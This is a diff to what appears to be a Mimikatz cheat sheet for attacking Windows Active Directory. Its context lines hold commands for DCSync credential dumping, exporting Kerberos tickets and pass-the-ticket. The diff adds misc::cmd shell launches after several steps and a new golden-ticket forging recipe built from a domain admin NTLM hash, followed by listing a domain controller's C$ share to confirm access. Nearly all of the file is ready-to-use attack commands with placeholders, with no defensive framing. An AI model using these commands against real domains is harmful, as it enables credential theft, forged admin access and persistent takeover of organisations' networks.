@@ -23,6 +23,7 @@ lsadump::dcsync /domain:<Fully Qualified Domain Name> /user:<ADMIN Username>
 
 sekurlsa::tickets /export
 kerberos::ptt ruserious.kirbi
+misc::cmd
 
 ****************************************************************************************************************************************
 
@@ -39,6 +40,7 @@ LM:NTLM
 kerberos::golden /user:<DOMAIN ADMIN NAME from "net localgroup administrators /domain"> /domain:<DOMAIN NAME from "whoami /user"> /sid:<SID from "whoami /user"> /sids:<Additional SID for Forest> /krbtgt:<NTLM HASH from "sekurlsa::krbtgt"> /startoffset:0 /endin:600 /renewmax:10080 /ptt
 
 kerberos::tgt
+misc::cmd
 
 ****************************************************************************************************************************************
 
@@ -51,5 +53,12 @@ kerberos::golden /domain:ADIOS /sid:<SID> /sids:<Additional SID for Forest> /aes
 kerberos::ptt ruserious.kirbi
 
 kerberos::tgt
+misc::cmd
 
+****************************************************************************************************************************************
+
+kerberos::golden /domain:<FULLY QUALIFIED DOMAIN NAME> /SID:<DOMAIN SID VALUE> /rc4:<DOMAIN ADMIN NTLM HASH> /user:<DOMAINUSER TO ASSIGN THE TICKET> /id:500 /ptt
+misc::cmd
+
+dir \\<DC HOST NAME>\c$ 
 ----------------------------------------------------------------------------------------------------------------------------------------
